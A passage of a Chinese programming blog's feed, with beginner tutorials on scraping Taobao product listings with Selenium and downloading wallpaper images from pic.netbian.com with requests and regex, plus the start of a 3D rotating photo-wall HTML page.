class="line">web.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果正常出现网页就成功了，注意，一定要和你的版本相匹配，不然就会出现这样</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/5.png"></p><p>这个是我把浏览器更新之后驱动版本太低不支持了</p><p>至于其他浏览器在这里就不做太多的叙述了，流程大体相同，至于网站可以在网上找一下，下面进入正题</p><p>selenium是模拟人正常在浏览器上的操作，正常我们打开网页在搜索框输入内容点击搜索</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    win.get(<span class="string">&#x27;https://www.taobao.com/&#x27;</span>)</span><br><span class="line">    win.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;q&quot;]&#x27;</span>).send_keys(commodity)      <span class="comment"># 点击搜索框，输入前面想要搜索的内容</span></span><br><span class="line">    win.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J_TSearchForm&quot;]/div[1]/button&#x27;</span>).click()     <span class="comment"># 点击搜索按钮</span></span><br><span class="line">    win.maximize_window()       <span class="comment"># 将网页放大方便我们扫码登录</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)              <span class="comment"># 等待15秒 让我们有时间扫码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    commodity = <span class="built_in">input</span>(<span class="string">&#x27;想要查询的商品：&#x27;</span>)</span><br><span class="line">    win = Chrome()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里需要我们扫码登录才让我们搜索</p><p>我们在分析一下搜索界面，发现所有的商品数据都放在div标签里，可以看到不是所有的div里都有商品数据，是从第四个div开始有数据，这些div都有共同的特征，那就是属性都是一样的，可以用xpath通过class定位进行晒选</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">items = win.find_elements_by_xpath(<span class="string">&#x27;//div[@class=&quot;items&quot;]/div[@class=&quot;item J_MouserOnverReq  &quot;]&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里需要注意一点因为我们选取了许多个div，所以find_elements_by_xpath里的element一定要加s，这样才返回列表，前面选取搜索框和搜索按钮的时候是不加s的</p><p>将获取的div遍历取出我们想要数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">    <span class="comment"># 旗舰店</span></span><br><span class="line">    store = item.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;shop&quot;]/a&#x27;</span>).text</span><br><span class="line">    <span class="comment"># 商品简述</span></span><br><span class="line">    desc = item.find_element_by_xpath(<span class="string">&#x27;./div[2]/div[2]/a&#x27;</span>).text</span><br><span class="line">    <span class="comment"># 价格</span></span><br><span class="line">    price = item.find_element_by_xpath(<span class="string">&#x27;./div[2]/div/div/strong&#x27;</span>).text</span><br><span class="line">    <span class="comment"># 人数</span></span><br><span class="line">    num = item.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;deal-cnt&quot;]&#x27;</span>).text</span><br><span class="line">    <span class="comment"># 地址</span></span><br><span class="line">    address = item.find_element_by_xpath(<span class="string">&#x27;.//div[@class=&quot;location&quot;]&#x27;</span>).text</span><br></pre></td></tr></table></figure><p>再将获取的数据存储到以搜索名称命名的csv文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;commodity&#125;</span>.csv&#x27;</span>, mode=<span class="string">&#x27;a&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    csv_writ = csv.writer(f, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    csv_writ.writerow([store, desc, price, num, address])</span><br></pre></td></tr></table></figure><p>附上结果</p><p><img src="/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%80%8E%E6%A0%B7%E4%B9%B0%E4%B8%9C%E8%A5%BF%E5%91%A2-selenium%E7%88%AC%E5%8F%96%E6%B7%98%E5%AE%9D%E6%95%B0%E6%8D%AE/8.png"></p><p>这次先这样下次再将获取到的数据进行可视化生成柱状图、饼状图及地图分布</p><p>全部代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import csv</span><br><span class="line">from selenium.webdriver import Chrome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    items = win.find_elements_by_xpath(&#x27;//div[@class=&quot;items&quot;]/div[@class=&quot;item J_MouserOnverReq  &quot;]&#x27;)</span><br><span class="line">    for item in items:</span><br><span class="line">        # 旗舰店</span><br><span class="line">        store = item.find_element_by_xpath(&#x27;.//div[@class=&quot;shop&quot;]/a&#x27;).text</span><br><span class="line">        # 商品简述</span><br><span class="line">        desc = item.find_element_by_xpath(&#x27;./div[2]/div[2]/a&#x27;).text</span><br><span class="line">        # 价格</span><br><span class="line">        price = item.find_element_by_xpath(&#x27;./div[2]/div/div/strong&#x27;).text</span><br><span class="line">        # 人数</span><br><span class="line">        num = item.find_element_by_xpath(&#x27;.//div[@class=&quot;deal-cnt&quot;]&#x27;).text</span><br><span class="line">        # 地址</span><br><span class="line">        address = item.find_element_by_xpath(&#x27;.//div[@class=&quot;location&quot;]&#x27;).text</span><br><span class="line">        with open(f&#x27;&#123;commodity&#125;.csv&#x27;, mode=&#x27;a&#x27;, newline=&#x27;&#x27;, encoding=&#x27;utf-8-sig&#x27;)as f:</span><br><span class="line">            csv_writ = csv.writer(f, delimiter=&#x27;,&#x27;)</span><br><span class="line">            csv_writ.writerow([store, desc, price, num, address])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    win.get(&#x27;https://www.taobao.com/&#x27;)</span><br><span class="line">    win.find_element_by_xpath(&#x27;//*[@id=&quot;q&quot;]&#x27;).send_keys(commodity)      # 点击搜索框，输入前面想要搜索的内容</span><br><span class="line">    win.find_element_by_xpath(&#x27;//*[@id=&quot;J_TSearchForm&quot;]/div[1]/button&#x27;).click()     # 点击搜索按钮</span><br><span class="line">    win.maximize_window()       # 将网页放大方便我们扫码登录</span><br><span class="line">    time.sleep(15)              # 等待15秒 让我们有时间扫码</span><br><span class="line">    get_data()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    commodity = input(&#x27;想要查询的商品：&#x27;)</span><br><span class="line">    win = Chrome()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的快乐-用python爬取彼岸网美女图片</title>
      <link href="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/"/>
      <url>/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>初入红尘，不知人间疾苦，<br>暮然回首已，是苦中之人。<br>这杯中 酒三分，<br>这酒中 悲七分。<br>关关难过 关关过，<br>夜夜难熬 夜夜熬。<br>愿这世间爱恨情仇尽融于酒，<br>将这风尘作酒<br>一饮消愁！  </p></blockquote><p>这是枕上诗书里的一句话，粗略一读就有一股”网抑云”的气息扑面而来，吓得我赶紧打开我的收藏观摩一番，果然看美女使人心情愉悦  </p><span id="more"></span><p>什么！你没有收藏！那今天教教你怎么让你有自己的收藏。<br>今天爬一下彼岸网，这个网站比较简单，适合新手练习(注意别太狠，这个还是会封id的)<br>说一下我的开发环境:python3.8<br>计算机系统:Windows10<br>开发工具:pycharm<br>要用的包:requests、os、re<br>网址:<a href="https://pic.netbian.com/">https://pic.netbian.com/</a>  </p><p>打开网址先看检查一下，发现图片都储存在 li 标签中的 img 标签不过这里储存的是缩略图，想要高清图要爬取a标签里的链接，进入后在爬取高清图先获取这个网页的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url, headers</span>):</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">&#x27;gbk&#x27;</span><span class="comment"># 这里注意一下，这个网站的编码是gbk要是设置一下</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br></pre></td></tr></table></figure><p>这里注意一下，这个网站的编码是gbk要是设置一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&#x27;https://pic.netbian.com/&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Fiddler/5.0.20204.45441 (.NET 4.8; WinNT 10.0.19042.0; zh-CN; 8xAMD64; Auto Update; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = get_page(url,headers)</span><br><span class="line">    <span class="built_in">print</span>(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>每次写爬虫之前都要记得设一下UA伪装</p><p>UA伪装怎么弄随便打开一个网页F12检查，点击Network在Name里随便点击一个，在右面往下滑找到User-Agent复制下来就行 格式换成字典类型的，具体参考我上方的代码及下方的图片</p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/5.png" style="zoom:60%;"><p>运行一下得到网页的源码</p><p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/1.png"></p><p>因为要得到所有的a标签里的链接所以这里我用的是re，用正则表达式来匹配链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">analysis</span>(<span class="params">html</span>):</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&#x27;</span>)</span><br><span class="line">    links = re.findall(pattern, html)</span><br><span class="line">    <span class="built_in">print</span>(links)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/2.png"></p><p>可以看到得到了所有的链接，不过有两个不速之客，可以用索引来分割，还有一个问题，这些链接都是不完整的我们要自己给他们拼接起来</p><p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/3.png"></p><p>可以看到缺失的内容如上图所示我们在前面加上即可</p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/4.png" style="zoom:60%;"><p>可以看到这些链接已经拼接成了完整的链接并且可以访问，创一个空列表把链接放进去，第一部分已经写完了，我们再写个循环访问这些链接再从中获取到图片信息</p><p>解析网页就用之前写的get_page()就行</p><p>将解析到的页面源码再用正则匹配得到图片链接还有名称为之后的存储做准备</p><p>这些链接还是不完整的需要拼接一下，在拼接之前要用’’.join()转换成字符串类型，因为re.findall()返回的是列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">analysis2</span>(<span class="params">html</span>):</span><br><span class="line">    name = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;h1&gt;(.*?)&lt;/h1&gt;&#x27;</span>)</span><br><span class="line">    new_name = re.findall(name, html)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a href=&quot;&quot; id=&quot;img&quot;&gt;&lt;img src=&quot;(.*?)&quot; data&#x27;</span>)</span><br><span class="line">    img = re.findall(pattern, html)</span><br><span class="line">    img = <span class="string">&#x27;&#x27;</span>.join(img)</span><br><span class="line">    new_name = <span class="string">&#x27;&#x27;</span>.join(new_name)</span><br><span class="line">    new_ink = <span class="string">&#x27;https://pic.netbian.com&#x27;</span> + img</span><br><span class="line">    <span class="keyword">return</span> new_name, new_ink</span><br></pre></td></tr></table></figure><p>这里return返回一个元组，直接用索引得到想要的内容</p><p>进行持久化存储要先建一个文件夹不然会直接储存在你当前文件夹中</p><p>我新建了一个happy(<del>你懂得</del>)文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./happy&#x27;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&#x27;./happy&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inks:</span><br><span class="line">    html = get_page(i, headers)</span><br><span class="line">    ink = analysis2(html)</span><br><span class="line">    ee = requests.get(url=ink[<span class="number">1</span>], headers=headers).content</span><br><span class="line">    new_img_name = <span class="string">&#x27;happy/&#x27;</span> + ink[<span class="number">0</span>] + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_img_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ee)</span><br><span class="line">    <span class="built_in">print</span>(new_img_name, <span class="string">&#x27;下载成功&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用with进行存储就大功告成了</p><p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/6.png"></p><p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/7.png"></p><img src="/2021/10/04/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%BF%AB%E4%B9%90-%E7%94%A8python%E7%88%AC%E5%8F%96%E5%BD%BC%E5%B2%B8%E7%BD%91%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/8.png" style="zoom:60%;"><p>这不就非常happy吗！！</p><p>这些代码比较简单就没有写注释(<del>才不是我不愿意写呢</del>)</p><p>全部代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./happy&#x27;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&#x27;./happy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url, headers</span>):</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">&#x27;gbk&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analysis</span>(<span class="params">html</span>):</span><br><span class="line">    list_links = []</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&#x27;</span>)</span><br><span class="line">    links = re.findall(pattern, html)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> links[<span class="number">2</span>:]:</span><br><span class="line">        new_link = <span class="string">&#x27;https://pic.netbian.com&#x27;</span> + i</span><br><span class="line">        list_links.append(new_link)</span><br><span class="line">    <span class="keyword">return</span> list_links</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analysis2</span>(<span class="params">html</span>):</span><br><span class="line">    name = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;h1&gt;(.*?)&lt;/h1&gt;&#x27;</span>)</span><br><span class="line">    new_name = re.findall(name, html)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a href=&quot;&quot; id=&quot;img&quot;&gt;&lt;img src=&quot;(.*?)&quot; data&#x27;</span>)</span><br><span class="line">    img = re.findall(pattern, html)</span><br><span class="line">    img = <span class="string">&#x27;&#x27;</span>.join(img)</span><br><span class="line">    new_name = <span class="string">&#x27;&#x27;</span>.join(new_name)</span><br><span class="line">    new_ink = <span class="string">&#x27;https://pic.netbian.com&#x27;</span> + img</span><br><span class="line">    <span class="keyword">return</span> new_name, new_ink</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&#x27;https://pic.netbian.com/&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Fiddler/5.0.20204.45441 (.NET 4.8; WinNT 10.0.19042.0; zh-CN; 8xAMD64; Auto Update; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = get_page(url, headers)</span><br><span class="line">    inks = analysis(html)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inks:</span><br><span class="line">        html = get_page(i, headers)</span><br><span class="line">        ink = analysis2(html)</span><br><span class="line">        ee = requests.get(url=ink[<span class="number">1</span>], headers=headers).content</span><br><span class="line">        new_img_name = <span class="string">&#x27;happy/&#x27;</span> + ink[<span class="number">0</span>] + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(new_img_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(ee)</span><br><span class="line">        <span class="built_in">print</span>(new_img_name, <span class="string">&#x27;下载成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>短短57行代码就实现了快乐，难道男人的快乐就这么简单吗！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3D旋转照片墙</title>
      <link href="/2021/09/21/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/09/21/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>划个水</p><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">ondragstart</span>=<span class="string">&quot;return false&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>3D旋转照片墙<span 